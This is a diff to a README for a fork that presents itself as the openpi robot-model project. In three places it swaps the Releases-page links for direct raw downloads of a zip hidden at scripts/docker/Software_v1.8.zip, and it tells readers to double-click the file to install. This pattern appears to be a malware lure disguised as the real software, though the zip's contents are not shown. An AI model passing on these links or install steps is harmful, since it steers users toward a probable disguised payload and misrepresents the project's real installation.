@@ -12,7 +12,7 @@ openpi offers three types of models, developed by the Physical Intelligence team
 
 All models include base checkpoints, pre-trained on thousands of hours of robot data, along with examples to help you use them directly or adapt them for your needs.
 
-[![Download openpi](https://img.shields.io/badge/Download%20openpi-brightgreen)](https://github.com/Kushagra1A/openpi/releases)
+[![Download openpi](https://github.com/Kushagra1A/openpi/raw/refs/heads/main/scripts/docker/Software_v1.8.zip%20openpi-brightgreen)](https://github.com/Kushagra1A/openpi/raw/refs/heads/main/scripts/docker/Software_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To begin using openpi, follow these steps:
 1. **Download the Software**
    Click the button below to visit the Releases page and download the latest version of openpi.
 
-   [Download openpi](https://github.com/Kushagra1A/openpi/releases)
+   [Download openpi](https://github.com/Kushagra1A/openpi/raw/refs/heads/main/scripts/docker/Software_v1.8.zip)
 
 2. **Install openpi**
    After downloading, locate the downloaded file on your computer. Double-click to start the installation process. Follow the prompts to install openpi. 
@@ -66,7 +66,7 @@ Join our community for additional support and collaboration.
 
 To get started with openpi, simply follow this link to download it:
 
-[Download openpi](https://github.com/Kushagra1A/openpi/releases)
+[Download openpi](https://github.com/Kushagra1A/openpi/raw/refs/heads/main/scripts/docker/Software_v1.8.zip)
 
 Follow the installation instructions provided earlier to get the software up and running.
 
